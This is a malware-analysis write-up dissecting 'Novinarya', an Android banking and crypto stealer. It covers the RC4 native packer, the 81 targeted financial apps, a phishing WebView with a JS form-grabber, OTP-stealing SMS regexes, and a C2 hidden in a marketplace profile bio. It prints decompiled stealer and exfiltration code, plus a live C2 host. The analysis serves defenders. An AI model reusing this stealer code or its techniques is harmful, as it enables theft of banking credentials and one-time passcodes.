---
title: "Novinarya: An Android stealer that hides its live C2 in a shop bio | STAR Labs"
source: https://starlabs.sg/blog/2026/10-novinarya-an-android-stealer-that-hides-its-live-c2-in-a-shop-bio/
source_host: starlabs.sg
clip_date: 2026-10-08T23:59:38+08:00
trace_id: 8bacb9a4-93cd-4484-b091-702426bbde11
content_hash: f5b8629a75d90a20117d63f39f1cef7b063537887fbd8761a74b2dc4a66acac3
status: synced
tags:
  - Android逆向
  - 恶意样本
series: null
feed_source: STAR Labs·漏洞研究
ai_summary: 伊朗安卓银行/加密货币窃密木马 Novinarya 用原生 RC4 加壳藏载荷，并把 C2 加密藏在自身 manifest 里、指向合法电商 Basalam 的卖家简介，最终完整还原出仍存活的真实 C2。
ai_summary_style: key-points
images_status:
  total: 1
  succeeded: 1
  failed_urls: []
notion_page_id: 3f375244-d011-81bd-85b2-e109439a12ce
ioc:
  cves: []
  cwes: []
  hashes:
    - 0834626e29e237472067e93e1a2bdacf4fddb0fe50cd5dc2846db3d57d6e1e52
    - 0e4d969a82dbe8b43d8f44a2adf55a658451ac2b107eea07c44c8d874c4f050f
    - 48c5cab842617c00b380d2c4effd8721
    - 6b16e0378ef82dd96105799b60ae2c48148920ed8ac9b561ddc6f4cf75695e23
    - 986f3b7e3a9465c784416c0f94ecf92c8afe1683e8be9afe35b9f8ce631660c7
    - a572a20b5aa7103d743769cd09bf08ede95903c315d1a4b61aa6cf5faee44b72
    - aa3bab5a28c4698374a70341529f1d353fb2bed658d93173f3ed898cd4b1b695
    - aa810bd9986b3439b8496cd5c5700d99f1ad941c44fc899a63448f981f341c24
    - be165239e4fe899b1f2eedf6459d363bca4fe6856fda87a63ba5d4e5e612e1c9
    - d265e43290267063afe37d34b709c684dd09a8d27f3e95c7255e06f232c2327a
    - d498cb64540bd2de8d08061bd8ae83562b998f24cc789b53eb103ab8ccf7b682
    - dc7532f136022464e7268f564e050c244e922efc1aa166a12ab9a562a3ab65b0
  domains:
    - theapi.the-x-services.xyz
  tools: []
  techniques: []
---

> 💡 **AI 总结（key-points）**
>
> 伊朗安卓银行/加密货币窃密木马 Novinarya 用原生 RC4 加壳藏载荷，并把 C2 加密藏在自身 manifest 里、指向合法电商 Basalam 的卖家简介，最终完整还原出仍存活的真实 C2。
> 
> - **双层加壳：** 外层仅 18KB dex 壳（net.swiftnova.bridge），真正的 B4A 窃密载荷封在 `assets/app_cache.db`（EPDATA 魔数），由 29KB 原生库 `libuibridge_9203.so` 以 RC4（32 字节密钥、丢弃 768 字节）加 zlib 解出；资源名、库名、密钥与变换每 build 随机化，内层 dex 却字节完全相同。
> - **窃取手法：** 硬编码 81 个目标（54 个加密交易所/钱包 + 27 个伊朗银行），靠 QUERY_ALL_PACKAGES 枚举；凭据靠钓鱼 WebView 加 JS 表单抓取（B4A 桥、UA 去掉 "; wv"），不申请无障碍或悬浮窗；另有短信/通知接收器用加密的 X_BANKS（25 家银行正则）提取账号、余额与 OTP。
> - **C2 解析链：** dex 内没有任何 C2 字符串，X_ROUTES 以 X_CID 为密钥 AES-CBC 解出 Basalam 用户页地址，再读该页 bio——前 10 字符作 deckey，其余用 AES-CBC（key=SHA-256(deckey)、16 字节 IV 前缀）解出实时 C2，运营者只改 bio 即可换服。
> - **存活与 IOC：** 该 build 的 dead drop（profile m6AJm5）当时未封禁，解出 `hxxp://theapi.the-x-services[.]xyz/`，回加密可复现同一 bio；同族另 4 个样本指向已封禁的 dxoeG7。basalam.com 属合法平台，不应封堵。

An Iranian Android banking and crypto stealer unpacks from a native RC4 packer, targets 81 financial apps through a phishing WebView, intercepts SMS one-time passcodes and resolves its command server from an encrypted pointer in its own manifest that points to a seller’s bio on a legitimate marketplace. This build’s dead drop was still live, so the real C2 (`theapi.the-x-services[.]xyz`) is recovered end to end.

## Key findings

-   **Two-layer app, native-packed.** The installed APK (package `ir.novinarya`) ships a thin loader shell (`net.swiftnova.bridge`, 18 KB dex). The stealer itself is a separate Basic4Android payload sealed inside `assets/app_cache.db` and unpacked on-device by a 29 KB native loader (`libuibridge_9203.so`) with RC4 (32-byte key, 768-byte drop) then zlib. Asset name, loader name, RC4 key and key transform are re-randomized per build; the unpacked payload is byte-identical across builds.
-   **81 financial targets.** It enumerates installed apps (`QUERY_ALL_PACKAGES`) and matches a hardcoded list of 54 crypto exchanges/wallets and 27 Iranian banking apps.
-   **Phishing WebView, not overlays.** Credential theft is a WebView loading an operator-controlled page (`WebViewURL`) with a JavaScript form-grabber over a native “B4A” bridge. The app requests no accessibility and no overlay permission.
-   **SMS and notification interception.** A broadcast receiver and an encrypted 25-bank regex config (`X_BANKS`) lift account numbers, balances and OTP codes from bank SMS and notifications.
-   **C2 is never a string.** The server resolves from an encrypted manifest meta-data value (`X_ROUTES`, AES-CBC keyed by `X_CID`) to a URL on `basalam.com`; the malware reads that profile’s `bio` and decrypts it to the live, rotating C2.
-   **Dead drop on a legitimate marketplace.** The operator rotates servers by editing one bio field. The resolver also carries an unused `[GITHUB]` branch.
-   **Live C2 recovered.** This build’s dead drop, Basalam profile `m6AJm5`, was live at analysis time. Its bio decrypts to the active command server `hxxp://theapi.the-x-services[.]xyz/`.
-   **Shared infrastructure, per-build repacking.** Five related samples decrypt to two dead-drop accounts: four point at `dxoeG7` (now banned) and this one rotated to `m6AJm5`. The inner stealer dex is identical across all of them, so only the packer and dead-drop config change per build.

## Technical analysis

### 01 The native packer and the unpacking chain

You will find the payload by reading the bootstrap, not by eyeballing the file tree. The APK’s `Application` class loads a native library and hands it control before any app code runs:

```java
// host classes.dex -> net/swiftnova/bridge/ModuleConfig.java   (jadx, verbatim)
public class ModuleConfig extends Application {
    private native void attachConfig();
    private static native void connectCore(Context context);
    static { System.loadLibrary("uibridge_9203"); }          // lib/arm64-v8a/libuibridge_9203.so
    protected void attachBaseContext(Context context) {
        super.attachBaseContext(context);
        connectCore(context);                                // native loader runs before any app code
    }
    public void onCreate() { super.onCreate(); attachConfig(); }
}
```

Inside `libuibridge_9203.so`, `connectCore` decrypts a filename, formats it into `assets/%s`, and opens it with `open()` / `mmap()`:

```asm
;libuibridge_9203.so  (capstone, arm64), inside connectCore's unpack path
...   bl    <str_decoder>     ; decrypt the asset-name string -> "app_cache.db"  (12 bytes)
...   adr   x2, <"assets/%s">  ; format string
...   bl    snprintf           ; -> "assets/app_cache.db"
...   bl    <open_asset>       ; open() + mmap() the asset   (imports: open, mmap, fopen)
; per build the asset name is re-randomized; here it is the only \x7fEPDATA asset, app_cache.db
```

The decrypted 12-byte filename is `app_cache.db`, the one asset carrying a `\x7fEPDATA` magic over a fake SQLite header, with a high-entropy (encrypted) body:

```bash
$ sha256sum sample.apk
be165239e4fe899b1f2eedf6459d363bca4fe6856fda87a63ba5d4e5e612e1c9  sample.apk

$ unzip -l sample.apk | sort -rn | head -5
   4799301  assets/app_cache.db
    192760  resources.arsc
     78908  AndroidManifest.xml
     62371  assets/index.html
     58783  res/drawable/icon.png

$ xxd assets/app_cache.db | head -2
00000000: 7f45 5044 4154 4100 0000 0000 353b 4900  .EPDATA.....5;I.
00000010: 5351 4c69 7465 2066 6f72 6d61 7420 3300  SQLite format 3.

$ python3 -c "import math,collections as C; d=open('assets/app_cache.db','rb').read()[64:]; \
n=len(d); c=C.Counter(d); print(round(-sum(v/n*math.log2(v/n) for v in c.values()),3),'bits/byte')"
8.0 bits/byte            # encrypted body, not a SQLite database
```

The loader builds its RC4 key from two `.rodata` arrays (XOR, then a 1-bit rotate in this build), decrypts the asset with RC4 (32-byte key, 768-byte keystream drop), and inflates the result:

```asm
;libuibridge_9203.so  sub_0x8eac , builds the 32-byte RC4 key
0x8eb4  adr   x9,  #0x2121        ; x9  -> .rodata+0x799   (array A, 32 bytes)
0x8ebc  add   x10, x10, #0x101    ; x10 -> .rodata+0x779   (array B, 32 bytes)
0x8ed0  eor   w11, w12, w11       ; for i in 0..31:  key[i] = A[i] ^ B[i]
0x8ef0  lsr   w10, w9, #7         ; then rotate-left-1:  key[i] = (key[i]<<1)|(key[i]>>7)
0x8ef4  orr   w9,  w10, w9, lsl #1
; key = rol1( rodata[0x799:+32] ^ rodata[0x779:+32] )
;     = a572a20b5aa7103d743769cd09bf08ede95903c315d1a4b61aa6cf5faee44b72
; (the byte transform and offsets are re-randomized per build; nibbleswap in 986f3b7e, rol1 here)
```

```asm
;libnetstack_baf0.so  sub_0x9238 , RC4
0x9284  and   x13, x9,  #0x1f     ; KSA mix: key index = i & 31   (=> 32-byte key)
0x92b4  mov   w9,  #0x300         ; discard first 0x300 = 768 keystream bytes
0x9328  eor   w12, w12, w13       ; PRGA: out = in ^ S[(S[i]+S[j]) & 255]
; signature: rc4(key=x0[32], in=x1, out=x2, len=x3), drop 768
```

```java
# reproduced from sub_0x8eac + the RC4 routine, run on the asset:
key   = rol1( rodata[0x799:+32] ^ rodata[0x779:+32] )
      = a572a20b5aa7103d743769cd09bf08ede95903c315d1a4b61aa6cf5faee44b72
inner = zlib.decompress( RC4(key, app_cache.db[64:], drop=768) )
#  -> 11,890,584 bytes : a 2-dex B4A bundle (classes1.dex 9,529,264 B + classes2.dex 2,361,308 B)
#  NB: both inner dex are byte-identical to 986f3b7e's (same SHA-256) , the stealer is shared,
#      only the outer packer and the dead-drop config are re-randomized per build.
```

That inner bundle is the actual stealer: a Basic4Android application, package `ir.novinarya`, about 34 classes including `domainmanager`, `corecache`, `cryptomanager`, `apiclient`, `webviewpage`, `xpackage` and `smsreceiver`. Everything from here on refers to this unpacked code; the outer `net.swiftnova.bridge` dex does nothing but load and run it.

### 02 Target apps and installed-app matching

The unpacked stealer hardcodes its target list in `ir/novinarya/xpackage.java`, verbatim:

```java
// inner bundle -> ir/novinarya/xpackage.java   (54 exchange/wallet + 27 bank apps = 81 targets)
this._exchange_packages = Common.ArrayToList(new String[]{
    "io.exnovin.app", "one.finex.android", "com.bitex.pooleno", "com.cafearz.app.crypto.cafe_arz",
    "com.kimiacurrency", "ir.twox.twa", "com.arz8x.app.arz8x", "com.myzarinx.app",
    "com.wallet.crypto.trustapp", "com.app.changekon", "app.podin", "com.exbito.app",
    "com.ramzinex.ramzinex", "io.bitpin.app", "land.tether.tetherland", "com.sekebit.app",
    "market.nobitex", "ir.wallex.app", "com.eterex", "com.arzif.android",
    "com.tabdeal", "ir.myter.bit24", "me.cbit", "com.tronlinkpro.wallet",
    "io.atomicwallet", "com.farachange.farachange", "co.okex.app", "com.tehranExchangeGroup.tehran_exchange",
    "app.coingram", "tech.waleto.app", "com.arzypto.my", "com.trendox.android",
    "com.excoino.excoino", "com.bitbarg.app", "io.rebix.app.android", "kajesabz.ir.bidarz",
    "net.erythron.net", "com.kickex.android", "com.exir.mobile", "ir.aban.th",
    "kifpool.me.v2", "com.sarmayex", "com.rabin.rabex", "net.arzplus.twa",
    "co.versland.app", "com.raastin.pro", "com.iranicard.app", "digital.kian.kiandigital",
    "com.arzpaya.arzpaya", "co.coinkadeexchange.app", "com.Digital.Currency.MyStore", "com.nipoto.app",
    "co.bitmit.app", "ir.bitmax.twa"
});

this._bank_packages = Common.ArrayToList(new String[]{
    "ir.bmi.bam.nativeweb", "com.dotin.wepod", "ir.karafarinbank.digital.mb", "com.samanpr.blu",
    "ir.mobillet.app", "digital.neobank", "com.ada.mbank.mehr", "com.gardeshpay.app",
    "com.sadadpsp.eva", "ir.zypod.app", "com.pmb.mobile", "mob.banking.android.sepah",
    "ir.ba24.key", "com.ada.mbank.bankette", "com.isc.bsinew", "ir.tejaratbank.tata.mobile.android.tejarat",
    "com.citydi.hplus", "com.bki.mobilebanking.android", "co.nilin.faraznative", "com.tosan.dara.postbank",
    "mob.banking.android.pasargad", "com.farazpardazan.enbank", "mob.banking.android.resalat", "com.parsmobapp",
    "mob.banking.android.gardesh", "com.tosan.dara.day", "com.tosan.dara.sarmayeh"
});
```

At runtime it enumerates installed packages and keeps only the ones the victim actually has, which is what `QUERY_ALL_PACKAGES` is for:

```java
// ir/novinarya/xpackage.java , enumerate installed apps, keep only the targets
List installed = packageManager.GetInstalledPackages();     // needs QUERY_ALL_PACKAGES
for (pkg in installed)
    if (_exchange_packages.IndexOf(pkg) >= 0 || _bank_packages.IndexOf(pkg) >= 0)
        matched.Add(pkg);                                   // which of the 81 targets the victim has
```

### 03 Credential capture: a phishing WebView with a JS form-grabber

Capture is not an overlay or an accessibility service (the app requests neither). It is a WebView that loads an operator-controlled page over a native bridge named `B4A`. Note the User-Agent is rewritten to drop the `; wv` token so the page cannot tell it is inside a WebView, and the page can be screenshotted:

```java
// ir/novinarya/webviewpage.java , WebView set up via reflection (decompiled)
WebSettings s = webview.getSettings();
s.setJavaScriptEnabled(true);
s.setDomStorageEnabled(true);  s.setDatabaseEnabled(true);
s.setSaveFormData(false);      s.setSavePassword(false);     // OS must not save; only the malware captures
s.setUserAgentString( ua.replace("; wv", "") );              // strip the "wv" token -> looks like real Chrome
webview.AddJavascriptInterface(jsBridge, "B4A");             // JS -> native bridge (WebViewExtras DefaultJavascriptInterface)
webview.LoadUrl( corecache.GetConfig("WebViewURL") );        // operator-controlled phishing page
// webviewpage can also screenshot the page: createBitmap -> JPEG -> Base64 (session capture)
```

The grabber itself is an obfuscated JavaScript string (`vvv13` -ciphered) injected into that page; on submit it reads the form fields and calls back through the `B4A` bridge:

```javascript
// ir/novinarya/formcaptureutils.java , the injected form-grabber
static String _form_capture_js = main.vvv13(<768-byte obfuscated byte[]>, seed);  // vvv13 = B4A string cipher -> the JS
map.Put("webViewUrl", corecache.GetConfig("WebViewURL", ""));
// the decoded JS is injected into the phishing page; on submit it reads the form fields and
// calls back through the "B4A" bridge, which hands the captured data to apiclient for exfil.
```

### 04 SMS and notification interception, and the bank scraper config

A broadcast receiver (`smsreceiver`) and the notification path feed a 25-bank regex config that ships in the manifest as the encrypted `X_BANKS` blob. It decrypts (AES-CBC, key = `X_SIG`) to per-bank patterns that lift account numbers, balances and OTP codes:

```java
// ir/novinarya/corecache.java , GetBanksJson(): decrypt X_BANKS, key = X_SIG
String banksB64 = GetManifestMetaString(ba, "X_BANKS");        // 26476 B base64
String sigKey   = GetManifestMetaString(ba, "X_SIG");          // "Who is the real God? Definitely Void."
String json     = appruntime.crypto()._decryptlocaltext_cbc_ivprefix(banksB64, sigKey);

// decrypted JSON , 1 of 25 bank entries (Bank Mellat), its SMS/notification scraper regexes:
"BankMellat": {
  "BankName": "بانک ملت",
  "Patterns": { "AccountNumber": "حساب(\d{6,12})", "Balance": "مانده([\d,]+)" },
  "Flags":    { "Pooya": "(?s).*رمز:?\s*\d{4,8}.*" }   // matches the OTP SMS  (رمز = passcode)
}
```

### 05 The C2 pointer is in the manifest

There is no C2 string anywhere in the dex, assets, resources or native library. The server ships as an encrypted `<meta-data>` entry:

```bash
$ androguard axml sample.apk | grep -A1 meta-data     # (abridged to the X_* keys)
package: ir.novinarya

X_CID    = 5i87c5
X_SIG    = Who is the real God? Definitely Void.
X_ROUTES = VbKKDflqpaGz+xcZq3hUKP085eiDo/x+2QJyO9rS/DfO+RHVAFGr1pQQ6dofgkuPJ0kY/NyCD3QO9xi4C1UpIb+0MhCduQj5M3Ny4HMEcdI=
X_RSA    = <572-byte base64 RSA-2048 public key, OAEP/SHA-256, the exfil key>
X_BANKS  = <26476-byte base64, AES/CBC key=X_SIG -> the 25-bank scraper config above>
```

At runtime `corecache` reads `X_ROUTES` and decrypts it with `X_CID` as the key:

```java
// ir/novinarya/corecache.java   (decompiled; _v<N>v names mapped to roles)

//  InitDefaults()           [corecache:198-218]
g_cid = sanitize( GetManifestMetaString(ba, "X_CID") );      // "5i87c5"  (fallback "NO_CID")

//  GetManifestMetaString(ba, name)   [corecache:140-164]
JavaObject ai = pm.RunMethod("getApplicationInfo",
                    new Object[]{ Application.getPackageName(), 128 });   // 128 = GET_META_DATA
return ai.GetField("metaData").RunMethod("getString", new Object[]{ name });

//  ResolveDomainUrl()       [corecache:172-182]
String enc = GetManifestMetaString(ba, "X_ROUTES");
String url = appruntime.crypto()._decryptlocaltext_cbc_ivprefix( enc, g_cid );  // KEY = X_CID
return sanitize(url);
//  -> https://services.basalam.com/web/v1/core/user/m6AJm5
```

```java
// same, raw jadx (names are literal runs of 'v'; _v<N>v = the length):
String _v109v0 = _v109v0(ba, "X_CID");
_v64v7 = _v7v7(ba, _v109v0);                                 // store CID in field _v64v7
public static String _v7v4(BA ba){ _v110v0(ba); return _v64v7; }   // getter -> CID
String _v109v0 = _v109v0(ba, "X_ROUTES");
String dec = appruntime._vv6(ba)._decryptlocaltext_cbc_ivprefix(_v110v1, _v7v4(ba));  // key = _v7v4() = CID
```

The decrypt is one routine, reused later for the bio: Base64, IV = first 16 bytes, key = `SHA-256(seed)`, AES-CBC/PKCS5:

```java
// ir/novinarya/cryptomanager.java , _decryptlocaltext_cbc_ivprefix(enc, deckey)   [221-256]
byte[] blob = base64Decode( sanitize(enc) );
byte[] iv   = blob[0 .. 16];                                 // _cbc_iv_size = 16 (IV is prefixed)
byte[] ct   = blob[16 .. end];
byte[] key  = MessageDigest.getInstance("SHA-256").digest( deckey.getBytes("UTF8") );
Cipher c = Cipher.getInstance("AES/CBC/PKCS5Padding");
c.init(DECRYPT_MODE, new SecretKeySpec(key,"AES"), new IvParameterSpec(iv));
return new String( c.doFinal(ct), "UTF-8" );
```

Running it on the sample’s own `X_ROUTES` with seed `"5i87c5"` yields the dead-drop URL, `https://services.basalam.com/web/v1/core/user/m6AJm5`. AES-CBC under a wrong key does not produce a clean, padded UTF-8 URL by chance, so this is the key.

### 06 The dead-drop fetch and the second decrypt

**Basalam** is Iran’s large social-commerce marketplace, legitimate, with millions of sellers. The malware abuses one profile on it as a dead drop. `domainmanager` GETs the decrypted URL, reads the profile’s `bio` field, splits it, and decrypts that to the final rotating C2:

```java
// ir/novinarya/domainmanager.java , ResumableSub_EnsureDomain  (source -> sink)
sourceUrl = corecache.ResolveDomainUrl(ba);        // = https://services.basalam.com/web/v1/core/user/m6AJm5
sourceTag = sourceUrl.toLowerCase().contains("basalam.com") ? "[BASALAM]" : "[GITHUB]";

httpjob j = new httpjob();                          // the fetch
j._initialize(ba, "domainfetch", this);
j.Download(sourceUrl.trim());                        // OkHttp GET of the Basalam profile
WaitFor("jobdone", ba, this, j);
rawContent = job.Success ? job.GetString() : "";

Map m = new JSONParser().Initialize(rawContent).NextObject();
content = (m.IsInitialized() && m.ContainsKey("bio")) ? m.Get("bio").toString().trim() : "";
if (content.length() <= 10) return "";
deckey    = content.substring(0, 10);                // first 10 chars = per-drop key
encDomain = content.substring(10);                   // rest = AES ciphertext
result = crypto()._decryptlocaltext_cbc_ivprefix(encDomain, deckey);   // second decrypt -> live C2
```

> \[!WARNING\] **Basalam or GitHub.** The resolver is built for two dead-drop hosts. The only GitHub reference in the entire sample is one branch tag:
> 
> ```java
> this._sourcetag = isBasalam ? "[BASALAM]" : "[GITHUB]";   // domainmanager.java:564
> ```
> 
> There is no `github.com` literal and no GitHub-specific parsing in this build. This sample’s `X_ROUTES` resolves only to Basalam, so GitHub is a supported capability of the resolver, not a host abused here.

### 07 Exfiltration

Captured credentials, OTP SMS and notification matches are AES-encrypted and POSTed to the same resolved domain, closing the source-to-sink loop. The domain is decrypted one more time here (the value carried from the Basalam bio), then the encrypted payload is sent:

```java
// ir/novinarya/apiclient.java , ResumableSub_SendAndReceive  (verbatim line refs)

// 1) decode the C2 host carried from the Basalam bio:
this._url = appruntime.crypto()._decrypt(this._domainenc, this._activepassphrase);   // [apiclient:503]
if (this._url.equals(""))                                                            // [apiclient:536]
    return error("domain_decrypt_failed");                                           // [apiclient:516]

// 2) encrypt the captured payload (WebView creds / OTP SMS / notification matches):
this._encresult = responsebuilder.EncryptPayload(this._rawpayload);                  // [apiclient:611-612]

// 3) POST it to the resolved C2:
this._job = CreateHttpJobFromEncrypted(this._url, this._encresult);                  // [apiclient:653]
```

The POST helper wraps the encrypted loot in a small JSON envelope and sends it as `application/json`:

```java
// ir/novinarya/apiclient.java , CreateHttpJobFromEncrypted(url, payload)   [apiclient:95-120]
Map env = new Map(); env.Initialize();
env.Put("clientID", this._clientID);
env.Put("DeviceID", this._deviceID);
env.Put("version",  this._api_version);
env.Put("payload",  payload.getObject());                 // the AES-encrypted loot
httpjob j = new httpjob(); j._initialize(ba, "", this);
j.PostString(url, new JSONGenerator(env).ToString());     // POST the JSON body to the Basalam-resolved C2
j.GetRequest().SetHeader("Content-Type", "application/json");
return j;
```

### 08 The live C2, decrypted from the marketplace bio

The URL is not a placeholder. Fetched live, the endpoint returns HTTP 200 for a real, **un-banned** Basalam account (`m6AJm5`, display name “morteza”, registered 2023) whose `bio` is a base64 blob, not prose:

```http
GET https://services.basalam.com/web/v1/core/user/m6AJm5   ->   200 OK
{
  "hash_id": "m6AJm5",   "id": 10118322,
  "name": "morteza",   "detected_first_name": "باسلامی",
  "created_at": "2023-02-04 20:14:47",   "last_activity": "2026-08-31 03:09:26",
  "ban_user": {},                              // NOT banned
  "bio": "guUpWcR7N45WiJEFglUrXIi7UcACWwc/i83/iQ6mEmyfsH67/ZtRZL/9me0ZGFLJzKX9262NBqavI+GJc7jeSBudvZZ9uhGw=="
}
# the bio is the live dead drop: deckey = bio[:10], the rest is AES ciphertext
```

![Live Basalam API response for account m6AJm5 showing an empty ban\_user and a base64 bio](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/10/a0a8d815bcf1af19.jpg)

The live response from the dead-drop endpoint. `ban_user` is empty and `bio` is base64. Re-fetch the URL to confirm.

Feeding that bio through the exact routine from Section 06 (deckey is the first ten characters, the rest is AES-CBC with `key = SHA-256(deckey)` and a 16-byte IV prefix) yields the live command server:

```java
# exactly what domainmanager does with the bio (verbatim steps):
bio    = "guUpWcR7N45WiJEFglUrXIi7UcACWwc/i83/iQ6mEmyfsH67/ZtRZL/9me0ZGFLJzKX9262NBqavI+GJc7jeSBudvZZ9uhGw=="
deckey = bio[:10]                               # "guUpWcR7N4"
enc    = bio[10:]
blob   = base64_decode(enc); iv = blob[:16]; ct = blob[16:]
key    = SHA-256(deckey)
C2     = AES_CBC_decrypt(key, iv, ct)           # cryptomanager._decryptlocaltext_cbc_ivprefix

C2  ->  http://theapi.the-x-services.xyz/
# round-trip verified: re-encrypting this domain with the recovered IV+key reproduces the exact bio.
```

So the full chain resolves, end to end, from a byte in the APK manifest to a running C2: `X_ROUTES` (manifest) decrypts to the Basalam URL, the profile’s `bio` decrypts to `hxxp://theapi.the-x-services[.]xyz/`, and the round trip confirms the decrypt is exact. This is the server the stealer POSTs its loot to.

### 09 Related samples

Across five samples of this family, the per-build packer randomization is cosmetic and the shared infrastructure is the real link. The inner stealer dex is byte-identical in every one (same SHA-256), so only the outer layer and the dead-drop account change:

| Sample (SHA-256) | X_CID | Dead drop | State / C2 |
| --- | --- | --- | --- |
| 986f3b7e3a9465c784416c0f94ecf92c8afe1683e8be9afe35b9f8ce631660c7 | 5i87c5 | dxoeG7 | banned, bio emptied |
| 6b16e0378ef82dd96105799b60ae2c48148920ed8ac9b561ddc6f4cf75695e23 | q17avl | dxoeG7 | banned, bio emptied |
| aa3bab5a28c4698374a70341529f1d353fb2bed658d93173f3ed898cd4b1b695 | x2tkqy | dxoeG7 | banned, bio emptied |
| aa810bd9986b3439b8496cd5c5700d99f1ad941c44fc899a63448f981f341c24 | kowsv3 | dxoeG7 | banned, bio emptied |
| be165239e4fe899b1f2eedf6459d363bca4fe6856fda87a63ba5d4e5e612e1c9 | 5i87c5 | m6AJm5 | LIVE, C2 = theapi.the-x-services\[.\]xyz |

`dxoeG7` shared across four builds is the operator pivot; `be165239` rotated to the still-live `m6AJm5`, which is why this build is the one that yields a usable C2.

## Conclusions

Novinarya is a conventional B4A credential stealer wrapped in two layers of indirection: a native RC4 packer that keeps the payload off every string scan, and a C2 resolver that keeps the server out of the binary entirely. The harvesting (phishing WebView, SMS, notifications) is ordinary; the tradecraft is in *reachability*.

For defenders and trackers, three points follow. Treat **“no static C2” as a failure state, not a finding**; here the pointer sat in the manifest the whole time, encrypted. **Instrument the sink**: the class that builds the request URL is worth more than the string table. And when a resolver abuses a legitimate platform, **record the mechanism, not the host**. I have listed the dead-drop technique and the decrypted domain, and never `basalam.com` or `github.com` as an indicator.

## Indicators of compromise

Hosts are defanged. `basalam.com` is a legitimate marketplace being abused as a dead drop and must not be blocked; the actionable indicators are the sample hashes, the package and file names, the manifest keys and the crypto parameters.

| Type | Indicator | Context |
| --- | --- | --- |
| C2 (live) | hxxp://theapi.the-x-services\[.\]xyz/ | the live command server, decrypted from the m6AJm5 bio (the actionable block target) |
| SHA-256 | be165239e4fe899b1f2eedf6459d363bca4fe6856fda87a63ba5d4e5e612e1c9 | APK, package ir.novinarya (B4A banking/crypto stealer) |
| MD5 | 48c5cab842617c00b380d2c4effd8721 | same APK |
| SHA-256 | dc7532f136022464e7268f564e050c244e922efc1aa166a12ab9a562a3ab65b0 | assets/app_cache.db, EPDATA-packed payload |
| SHA-256 | d498cb64540bd2de8d08061bd8ae83562b998f24cc789b53eb103ab8ccf7b682 | lib/arm64-v8a/libuibridge_9203.so, native RC4 loader |
| SHA-256 | 0e4d969a82dbe8b43d8f44a2adf55a658451ac2b107eea07c44c8d874c4f050f | host classes.dex (net.swiftnova loader shell) |
| SHA-256 | 0834626e29e237472067e93e1a2bdacf4fddb0fe50cd5dc2846db3d57d6e1e52 | decrypted inner classes1.dex (B4A stealer; SAME across all builds) |
| SHA-256 | d265e43290267063afe37d34b709c684dd09a8d27f3e95c7255e06f232c2327a | decrypted inner classes2.dex (SAME across all builds) |
| Package | ir.novinarya | application package |
| Package | net.swiftnova.bridge | native-loader shell (ModuleConfig) |
| File | lib/arm64-v8a/libuibridge_9203.so | native EPDATA/RC4 loader (name re-randomized per build) |
| File | assets/app_cache.db | EPDATA-packed payload (magic 7f 45 50 44 41 54 41; name re-randomized) |
| Dead-drop URL | hxxps://services.basalam\[.\]com/web/v1/core/user/m6AJm5 | endpoint the resolver GETs; LEGITIMATE host abused, do NOT block basalam\[.\]com |
| Dead-drop acct | basalam\[.\]com profile hash_id “m6AJm5” (name “morteza”) | the live dead drop; its bio holds the encrypted C2 |
| Dead-drop acct (burned) | basalam\[.\]com profile hash_id “dxoeG7” | earlier dead drop shared by four related builds; now banned, bio emptied |
| Mechanism | \[BASALAM\] / \[GITHUB\] bio dead drop | domainmanager resolves the rotating C2 from a profile bio field |
| Manifest meta | X_ROUTES | AES/CBC(SHA-256(X_CID)) -> dead-drop URL |
| Manifest meta | X_CID = 5i87c5 | key seed for the X_ROUTES decrypt (per-build; here 5i87c5) |
| Manifest meta | X_SIG = Who is the real God? Definitely Void. | key seed for the X_BANKS decrypt |
| Crypto key | a572a20b5aa7103d743769cd09bf08ede95903c315d1a4b61aa6cf5faee44b72 | native RC4 key = rol1(rodata\[0x799\]^rodata\[0x779\]), drop 768 (transform re-randomized per build) |
| Crypto | AES/CBC/PKCS5, 16-byte IV prefix, key = SHA-256(seed) | manifest + bio decrypt routine (cryptomanager) |
